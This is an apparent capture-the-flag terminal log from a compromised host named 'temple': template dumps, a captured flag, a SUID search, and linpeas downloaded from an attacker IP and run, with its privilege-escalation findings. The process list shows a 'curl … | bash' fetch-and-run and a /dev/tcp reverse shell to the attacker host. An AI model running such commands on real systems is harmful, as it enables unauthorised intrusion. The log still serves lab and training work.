  height: 100%;
  overflow: auto;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

li a.active {
  background-color: #8B0000;
  color: white;
}

li a:hover:not(.active) {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>

<ul>
  <li><a href="/home">Home</a></li>
  <li><a href="/internal">Internal News</a></li>
  <li><a class="active" href="/external">External News</a></li>
  <li><a href="/account">Account</a></li>
  <li><a href="/logout">Log Out</a></li>
</ul>

<div style="margin-left:11%;padding:1px 16px;height:1000px;">
  <h2>External news</h2>
  <h3>We work hard, but also play hard</h3>
  <p><br>Any cool news we should know about? Contact us!</p>
  <p>external@templeindustries.local</p>
</div>

</body>
</html>

bill@temple:~/webapp/templates$ cat home.html
cat home.html

{% block content %}
<!DOCTYPE html>
<html>
<head>
<style>
body {
  margin: 0;
}

ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 10%;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

li a.active {
  background-color: #8B0000;
  color: white;
}

li a:hover:not(.active) {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>

<ul>
  <li><a class="active" href="/home">Home</a></li>
  <li><a href="/internal">Internal News</a></li>
  <li><a href="/external">External News</a></li>
  <li><a href="/account">Account</a></li>
  <li><a href="/logout">Log Out</a></li>
</ul>

<div style="margin-left:11%;padding:1px 16px;height:1000px;">
  <h2>Welcome!</h2>
  <h3>The main dashboard is still under development</h3>
  <p>Stay put for more features.</p>
  <p>Any features that we should implement? Contact our local developers!</p>
  <p>Make sure to read both the internal and external news on a daily basis.</p>
  <br>
  <p>Logged in from source {% if current_ip %} {{ current_ip }} {% endif %}</p>
  <p>Please contact our staff for support</p>
  <p>support@templeindustries.local</p>
</div>

</body>
</html>

{% endblock %}bill@temple:~/webapp/templates$ cat internal.html
cat internal.html


{% block content %}
<!DOCTYPE html>
<html>
<head>
<style>
body {
  margin: 0;
}

ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 10%;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

li a.active {
  background-color: #8B0000;
  color: white;
}

li a:hover:not(.active) {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>

<ul>
  <li><a href="/home">Home</a></li>
  <li><a class="active" href="/internal">Internal News</a></li>
  <li><a href="/external">External News</a></li>
  <li><a href="/account">Account</a></li>
  <li><a href="/logout">Log Out</a></li>
</ul>

<div style="margin-left:11%;padding:1px 16px;height:1000px;">
  <h2>Internal news</h2>
  <br><h3>1. New features</h3>
  <p>As many of you may be aware of, we are still working on the application.<br>
  Please be patient, as new features will be implemented according to the business plan.</p><br>
  <h3>2. Developers</h3>
  <p>We are currently hiring new developers! Know someone who is skilled with:<br>
  - PHP (yes, we know, we know...)<br>
  - Pascal<br>
  - JavaScript<br>
  - Python<br>
  - Perl<br><br>
  Then please give us a tip at hiring@templeindustries.local. We are offering recruitment bonuses.</p><br>
  <p><br>Any cool news we should know about? Contact us!</p>
  <p>internal@templeindustries.local</p>
</div>

</body>
</html>

{% endblock %}

bill@temple:~$ cat flag1.txt
cat flag1.txt
7362bee1e78243f4811f26565137d5e20cbd9af0

bill@temple:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root             43K Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             27K Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/11316/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/11316/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/11316/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/11316/bin/su
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/11316/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/11316/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/11316/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/11316/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/11316/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/11316/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jan 20  2021 /snap/core/11316/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Jun  7  2021 /snap/core/11316/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            109K Jun 15  2021 /snap/core/11316/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jul 23  2020 /snap/core/11316/usr/sbin/pppd
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/11743/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/11743/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/11743/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/11743/bin/su
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/11743/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/11743/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/11743/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/11743/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/11743/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/11743/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jan 20  2021 /snap/core/11743/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Jun  7  2021 /snap/core/11743/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            109K Aug 27  2021 /snap/core/11743/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jul 23  2020 /snap/core/11743/usr/sbin/pppd
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
-rwSr--r-- 1 root   root            146K Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root   messagebus       42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            427K Aug 11  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root   root            116K Jun 15  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   telnetd          11K Nov  7  2016 /usr/lib/telnetlogin
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

bill@temple:/tmp$ curl http://10.8.19.103:80/linpeas.sh -o linpeas.sh
curl http://10.8.19.103:80/linpeas.sh -o linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  758k  100  758k    0     0   388k      0  0:00:01  0:00:01 --:--:--  387k
bill@temple:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
bill@temple:/tmp$ ./linpeas.sh

./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------| 
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 4.15.0-159-generic (buildd@lgw01-amd64-055) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021
User & Groups: uid=1000(bill) gid=1000(bill) groups=1000(bill),4(adm),24(cdrom),30(dip),46(plugdev)
Hostname: temple
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc.openbsd is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-159-generic (buildd@lgw01-amd64-055) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.6 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version

╔══════════╣ CVEs Check
stat: missing operand
Try 'stat --help' for more information.
./linpeas.sh: 1197: ./linpeas.sh: [[: not found
./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
./linpeas.sh: 1197: ./linpeas.sh: 0: not found
./linpeas.sh: 1207: ./linpeas.sh: [[: not found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/home/bill/webapp
New path exported: /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/home/bill/webapp

╔══════════╣ Date & uptime
Wed Jan 25 00:33:27 UTC 2023
 00:33:27 up 53 min,  0 users,  load average: 4.00, 2.93, 2.17

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices
UUID=809fdfc8-ebef-11eb-acb5-0800277626ef	/	ext4	defaults	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /bin/lesspipe %s
HISTFILESIZE=0
SHLVL=4
OLDPWD=/home/bill/webapp
HOME=/home/bill
LOGNAME=bill
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/home/bill/webapp
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=
SHELL=/bin/sh
LESSCLOSE=/bin/lesspipe %s %s
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════
                                             ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/lxc
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
                          ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.3  0.5 159792  5284 ?        Ss   Jan24   0:11 /sbin/init maybe-ubiquity
root       420  0.1  0.6  94648  6352 ?        S<s  Jan24   0:05 /lib/systemd/systemd-journald
root       422  0.0  0.1  97716  1360 ?        Ss   Jan24   0:00 /sbin/lvmetad -f
root       431  0.0  0.3  45444  3404 ?        Ss   Jan24   0:00 /lib/systemd/systemd-udevd
systemd+   471  0.0  0.1 141788  1324 ?        Ssl  Jan24   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   663  0.0  0.2  79920  2772 ?        Ss   Jan24   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   669  0.0  0.2  70496  2876 ?        Ss   Jan24   0:00 /lib/systemd/systemd-resolved
syslog     747  0.0  0.3 267276  3332 ?        Ssl  Jan24   0:00 /usr/sbin/rsyslogd -n
root       762  0.0  0.3  61992  3664 ?        Ss   Jan24   0:00 /lib/systemd/systemd-logind
root       765  0.0  0.2  30036  2388 ?        Ss   Jan24   0:00 /usr/sbin/cron -f
root       769  0.0  0.2  57508  2544 ?        S    Jan24   0:00  _ /usr/sbin/CRON -f
bill       785  0.0  0.0   4636   684 ?        Ss   Jan24   0:00      _ /bin/sh -c sleep 30; cd /home/bill/webapp; /usr/bin/python3 /home/bill/webapp/webapp.py
bill      1289  0.0  2.6 240896 26696 ?        Sl   Jan24   0:01          _ /usr/bin/python3 /home/bill/webapp/webapp.py
bill      3597  0.0  0.0   4636   804 ?        S    00:28   0:00              _ /bin/sh -c curl 10.8.19.103/rce | bash
bill      3599  0.0  0.2  11600  2088 ?        S    00:28   0:00                  _ bash
bill      3603  0.0  0.2  11600  2072 ?        S    00:28   0:00                      _ bash -c bash -i >& /dev/tcp/10.8.19.103/1337 0>&1
bill      3604  0.0  0.3  21372  3828 ?        S    00:28   0:00                          _ bash -i
bill      3622  0.0  0.8  39092  8828 ?        S    00:28   0:00                              _ python3 -c import pty;pty.spawn("/bin/bash")
bill      3623  0.0  0.3  21496  3940 pts/0    Ss   00:28   0:00                                  _ /bin/bash
bill      3640  0.1  0.2   5872  2880 pts/0    S+   00:28   0:00                                      _ /bin/sh ./linpeas.sh
bill      7683  0.0  0.1   5872  1268 pts/0    S+   00:34   0:00                                          _ /bin/sh ./linpeas.sh
bill      7687  0.0  0.3  38532  3572 pts/0    R+   00:34   0:00                                          |   _ ps fauxwww
bill      7686  0.0  0.1   5872  1268 pts/0    S+   00:34   0:00                                          _ /bin/sh ./linpeas.sh
root       767  0.0  0.3 286252  3436 ?        Ssl  Jan24   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       772  0.0  0.2  34004  2564 ?        Ss   Jan24   0:00 /usr/sbin/inetd
daemon[0m     775  0.0  0.2  28340  2032 ?        Ss   Jan24   0:00 /usr/sbin/atd -f
root       783  0.0  0.6 1232248 6748 ?        Ssl  Jan24   0:00 /usr/bin/amazon-ssm-agent
root      1004  0.0  1.0 1171180 10376 ?       Sl   Jan24   0:00  _ /usr/bin/ssm-agent-worker
root       796  0.3  0.2 636996  2932 ?        Ssl  Jan24   0:10 /usr/bin/lxcfs /var/lib/lxcfs/
root       809  0.0  1.0 169104 10284 ?        Ssl  Jan24   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
message+   810  0.0  0.3  50064  3316 ?        Ss   Jan24   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       819  0.0  1.0 185952 10988 ?        Ssl  Jan24   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       820  0.1  1.6 638072 16504 ?        Ssl  Jan24   0:03 /usr/lib/snapd/snapd
root       821  0.0  0.2  72308  2584 ?        Ss   Jan24   0:00 /usr/sbin/sshd -D
root       822  0.0  0.1  29156  1776 ?        Ss   Jan24   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       827  0.0  0.2 291464  2820 ?        Ssl  Jan24   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       847  0.0  0.1  14672  1756 ttyS0    Ss+  Jan24   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       853  0.0  0.1  14896  1568 tty1     Ss+  Jan24   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       858  0.0  0.3  78200  3164 ?        Ss   Jan24   0:00 /usr/sbin/apache2 -k start
www-data   867  0.0  0.3 830492  3368 ?        Sl   Jan24   0:00  _ /usr/sbin/apache2 -k start
www-data   872  0.0  0.3 830492  3368 ?        Sl   Jan24   0:00  _ /usr/sbin/apache2 -k start
mysql      984  0.0  6.3 653752 63988 ?        Ssl  Jan24   0:02 /usr/sbin/mysqld
root      1291 88.7 48.4 2494644 488168 ?      SNsl Jan24  47:25 /usr/share/logstash/jdk/bin/java -Xms128m -Xmx256m -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -Djruby.regexp.interruptible=true -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -Dlog4j2.isThreadContextMapInheritable=true -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/checker-compat-qual-2.0.0.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.1.0.jar:/usr/share/logstash/logstash-core/lib/jars/commons-logging-1.2.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.1.3.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-24.1.1-jre.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.10.8.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-yaml-2.9.10.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.1.0.jar:/usr/share/logstash/logstash-core/lib/jars/javassist-3.26.0-GA.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.2.19.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-1.2-api-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-jcl-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.14.0.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/reflections-0.9.11.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.30.jar:/usr/share/logstash/logstash-core/lib/jars/snakeyaml-1.23.jar org.logstash.Logstash --path.settings /etc/logstash

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd process found (dump creds from memory as root)
apache2 process found (dump creds from memory as root)
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
